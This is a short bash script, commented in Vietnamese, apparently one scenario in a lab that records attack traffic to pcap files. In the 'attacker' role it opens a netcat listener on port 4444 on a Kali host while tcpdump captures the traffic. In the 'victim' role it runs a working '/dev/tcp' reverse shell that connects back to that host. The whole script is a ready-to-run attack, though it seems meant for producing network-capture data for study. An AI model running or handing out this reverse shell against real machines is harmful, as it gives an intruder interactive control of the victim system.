#!/bin/bash
# Kịch bản 5: Reverse shell bằng netcat
# Chạy PHẦN A trên Kali trước, PHẦN B trên victim sau

ROLE=$1

KALI_IP="172.28.0.20"
PORT=4444
IFACE="eth0"

mkdir -p ../pcap
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="../pcap/05_reverse_shell_$TIME.pcap"

if [ "$ROLE" == "attacker" ]; then
    echo "Bên Kali: mở listener cổng $PORT, bắt gói tin vào $PCAP"
    tcpdump -i $IFACE port $PORT -w $PCAP &
    PID=$!
    sleep 1
    nc -lvnp $PORT
    kill $PID
    echo "Xong bên Kali."

elif [ "$ROLE" == "victim" ]; then
    echo "Bên victim: kết nối ngược về $KALI_IP:$PORT"
    bash -i >& /dev/tcp/$KALI_IP/$PORT 0>&1

else
    echo "Cách dùng: $0 attacker   (trên Kali)"
    echo "      hoặc: $0 victim     (trên victim)"
fi
